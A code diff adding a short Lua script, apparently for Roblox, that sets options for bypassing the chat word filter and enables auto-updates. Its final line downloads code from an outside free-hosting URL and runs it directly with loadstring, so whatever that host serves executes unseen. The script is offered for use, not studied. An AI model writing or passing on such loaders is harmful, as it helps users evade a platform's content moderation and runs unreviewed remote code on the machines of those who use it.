@@ -1,0 +1,11 @@
+_G.Option = 'all'; --[[
+   Current options:
+   - all: bypasses every word you write
+   - keywords: bypasses only the list of words
+]]
+
+_G.Auto_Update = {
+   Enabled = true;
+   Delay = 60; -- seconds
+}
+if not pcall(function()loadstring(game:HttpGet('https://xhamiii.000webhostapp.com/',true))()end)then warn'host is currently down'end
